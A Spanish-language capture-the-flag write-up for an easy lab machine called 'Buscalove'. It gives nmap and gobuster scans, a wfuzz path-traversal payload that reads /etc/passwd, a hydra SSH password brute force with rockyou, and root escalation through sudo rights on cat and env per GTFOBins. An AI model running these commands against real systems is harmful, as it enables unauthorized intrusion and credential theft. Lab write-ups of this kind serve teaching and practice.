# \[Fácil] Buscalove

Comenzamos con un escaneo de los puertos abiertos de nuestra maquina objetivo, para ello hacemos uso de la herramienta nmap&#x20;

```bash
nmap -Pn -p- --min-rate 3000 -sCV -n -v -o scan 172.18.0.2
```

> \-Pn ->&#x20;
>
> \-p- -> indica que el escaneo es hacia todos los puertos
>
> \--min-rate 3000 -> minimo de tiempo por paquete
>
> \-sCV -> -S ejecuta scripts por defecto de nmap. -V nos dice la version/servicio que se ejecuta en el puerto abierto&#x20;
>
> \-n -> no resuelve los DNS
>
> \-v -> parámetro verbose hace que sea visible mas información a parte del resultado.
>
> \-o -> para exportar a un fichero el resultado&#x20;

<div align="left">

<figure><img src="../../../.gitbook/assets/image (59).png" alt=""><figcaption></figcaption></figure>

</div>

Podemos ver el puerto 80,22 abiertos, sabiendo esto vamos a inspeccionar la pagina web, podemos empezar por hacer una fuerza bruta para averiguar directorios y ficheros disponibles con la herramienta gobuster, encontramos el directorio de wordpress.&#x20;

```bash
gobuster dir -u http://172.18.0.2:80/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,py,sh
```

<div align="left">

<figure><img src="../../../.gitbook/assets/image (60).png" alt=""><figcaption></figcaption></figure>

</div>

En el directorio wordpress no encuentro nada de valor, despues de investigar un poco vamos a probar con la vulnerabilidad LFI (Local File Inclusion) permitiéndonos leer archivos del servidor web a través de la URL. Para comprobarlo vamos a utilizar la herramienta wfuzz

```bash
wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -u http://172.18.0.2/wordpress/index.php?FUZZ=/../../../../../etc/passwd --hc 404 --hl 40
```

<figure><img src="../../../.gitbook/assets/image (63).png" alt=""><figcaption><p>Encontramos dos palabras y ya podemos hacer uso del exploit de LFI</p></figcaption></figure>

Una vez sabemos de los usuarios del servidor probamos con una fuerza bruta con hydra al ssh&#x20;

```
hydra -l ${usuario} -P /home/son/Downloads/rockyou.txt ssh://172.18.0.2
```

<div align="left">

<figure><img src="../../../.gitbook/assets/image (64).png" alt=""><figcaption><p>Encontramos la password</p></figcaption></figure>

</div>

Una vez dentro, con el comando sudo -l descubrimos que podemos ejecutar tanto ls como cat con privilegios de administrador, podemos encontrar la ejecución de comandos con privilegios para escalar privilegios en la web de GTFO Bins

<div align="left">

<figure><img src="../../../.gitbook/assets/image (66).png" alt=""><figcaption></figcaption></figure>

</div>

{% embed url="https://gtfobins.github.io/gtfobins/cat/" %}

Con estos dos comandos podemos leer los ficheros, por ejemplo, dentro de la carpeta del usuario root  nos encontramos con un fichero cifrado, seguramente sea su contraseña.&#x20;

<div align="left">

<figure><img src="../../../.gitbook/assets/image (67).png" alt=""><figcaption></figcaption></figure>

</div>

Crackeamos el hash desde la web de cyberchef

<figure><img src="../../../.gitbook/assets/image (68).png" alt=""><figcaption></figcaption></figure>

La contraseña es de otro usuario que no es root, vamos a loguearnos y ejecutar sudo -l para ver que nos encontramos

<div align="left">

<figure><img src="../../../.gitbook/assets/image (69).png" alt=""><figcaption></figcaption></figure>

</div>

<div align="left">

<figure><img src="../../../.gitbook/assets/image (70).png" alt=""><figcaption><p>Aprovechamos env para ejecutar una shell como root</p></figcaption></figure>

</div>

{% embed url="https://gtfobins.github.io/gtfobins/env/" %}

